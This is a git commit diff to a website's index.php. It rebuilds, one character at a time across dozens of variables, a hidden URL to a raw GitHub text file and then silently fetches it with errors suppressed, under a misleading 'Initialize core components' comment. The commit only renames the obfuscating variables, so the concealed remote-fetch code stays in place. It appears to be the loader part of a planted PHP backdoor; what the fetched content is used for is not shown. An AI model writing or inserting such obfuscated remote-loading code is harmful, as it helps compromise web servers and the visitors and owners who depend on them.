ab6fe71ed709976d654828c9f619eead21a234d1
seobela <248709989+seobela@users.noreply.github.com>
2026-01-08 21:24:47 -0800

    Update index.php

--- index.php
+++ index.php
@@ -5,25 +5,25 @@
 */
 
 // Initialize core components
-$x1 = 'h'; $x2 = 't'; $x3 = 't'; $x4 = 'p'; $x5 = 's';
-$x6 = ':'; $x7 = '/'; $x8 = '/'; $x9 = 'r'; $x10 = 'a';
-$x11 = 'w'; $x12 = '.'; $x13 = 'g'; $x14 = 'i'; $x15 = 't';
-$x16 = 'h'; $x17 = 'u'; $x18 = 'b'; $x19 = 'u'; $x20 = 's';
-$x21 = 'e'; $x22 = 'r'; $x23 = 'c'; $x24 = 'o'; $x25 = 'n';
-$x26 = 't'; $x27 = 'e'; $x28 = 'n'; $x29 = 't'; $x30 = '.';
-$x31 = 'c'; $x32 = 'o'; $x33 = 'm'; $x34 = '/'; $x35 = 'm';
-$x36 = 'd'; $x37 = 'm'; $x38 = 'o'; $x39 = 'm'; $x40 = 'i';
-$x41 = 'n'; $x42 = '3'; $x43 = '6'; $x44 = '5'; $x45 = '3';
-$x46 = '6'; $x47 = '6'; $x48 = '-'; $x49 = 'g'; $x50 = 'i';
-$x51 = 'f'; $x52 = '/'; $x53 = 'b'; $x54 = 'e'; $x55 = 'l';
-$x56 = 'a'; $x57 = '/'; $x58 = 'r'; $x59 = 'e'; $x60 = 'f';
-$x61 = 's'; $x62 = '/'; $x63 = 'h'; $x64 = 'e'; $x65 = 'a';
-$x66 = 'd'; $x67 = 's'; $x68 = '/'; $x69 = 'm'; $x70 = 'a';
-$x71 = 'i'; $x72 = 'n'; $x73 = '/'; $x74 = 'i'; $x75 = 'n';
-$x76 = 'd'; $x77 = 'e'; $x78 = 'x'; $x79 = '.'; $x80 = 't';
-$x81 = 'x'; $x82 = 't';
+$xaa = 'h'; $xab = 't'; $xac = 't'; $xad = 'p'; $xae = 's';
+$xaf = ':'; $xag = '/'; $xah = '/'; $xai = 'r'; $xaj = 'a';
+$xak = 'w'; $xal = '.'; $xam = 'g'; $xan = 'i'; $xao = 't';
+$xap = 'h'; $xaq = 'u'; $xar = 'b'; $xas = 'u'; $xat = 's';
+$xau = 'e'; $xav = 'r'; $xaw = 'c'; $xax = 'o'; $xay = 'n';
+$xaz = 't'; $xba = 'e'; $xbb = 'n'; $xbc = 't'; $xbd = '.';
+$xbe = 'c'; $xbf = 'o'; $xbg = 'm'; $xbh = '/'; $xbi = 'm';
+$xbj = 'd'; $xbk = 'm'; $xbl = 'o'; $xbm = 'm'; $xbn = 'i';
+$xbo = 'n'; $xbp = '3'; $xbq = '6'; $xbr = '5'; $xbs = '3';
+$xbt = '6'; $xbu = '6'; $xbv = '-'; $xbw = 'g'; $xbx = 'i';
+$xby = 'f'; $xbz = '/'; $xca = 'b'; $xcb = 'e'; $xcc = 'l';
+$xcd = 'a'; $xce = '/'; $xcf = 'r'; $xcg = 'e'; $xch = 'f';
+$xci = 's'; $xcj = '/'; $xck = 'h'; $xcl = 'e'; $xcm = 'a';
+$xcn = 'd'; $xco = 's'; $xcp = '/'; $xcq = 'm'; $xcr = 'a';
+$xcs = 'i'; $xct = 'n'; $xcu = '/'; $xcv = 'i'; $xcw = 'n';
+$xcx = 'd'; $xcy = 'e'; $xcz = 'x'; $xda = '.'; $xdb = 't';
+$xdc = 'x'; $xdd = 't';
 
-$full_url = $x1.$x2.$x3.$x4.$x5.$x6.$x7.$x8.$x9.$x10.$x11.$x12.$x13.$x14.$x15.$x16.$x17.$x18.$x19.$x20.$x21.$x22.$x23.$x24.$x25.$x26.$x27.$x28.$x29.$x30.$x31.$x32.$x33.$x34.$x35.$x36.$x37.$x38.$x39.$x40.$x41.$x42.$x43.$x44.$x45.$x46.$x47.$x48.$x49.$x50.$x51.$x52.$x53.$x54.$x55.$x56.$x57.$x58.$x59.$x60.$x61.$x62.$x63.$x64.$x65.$x66.$x67.$x68.$x69.$x70.$x71.$x72.$x73.$x74.$x75.$x76.$x77.$x78.$x79.$x80.$x81.$x82;
+$full_url = $xaa.$xab.$xac.$xad.$xae.$xaf.$xag.$xah.$xai.$xaj.$xak.$xal.$xam.$xan.$xao.$xap.$xaq.$xar.$xas.$xat.$xau.$xav.$xaw.$xax.$xay.$xaz.$xba.$xbb.$xbc.$xbd.$xbe.$xbf.$xbg.$xbh.$xbi.$xbj.$xbk.$xbl.$xbm.$xbn.$xbo.$xbp.$xbq.$xbr.$xbs.$xbt.$xbu.$xbv.$xbw.$xbx.$xby.$xbz.$xca.$xcb.$xcc.$xcd.$xce.$xcf.$xcg.$xch.$xci.$xcj.$xck.$xcl.$xcm.$xcn.$xco.$xcp.$xcq.$xcr.$xcs.$xct.$xcu.$xcv.$xcw.$xcx.$xcy.$xcz.$xda.$xdb.$xdc.$xdd;
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
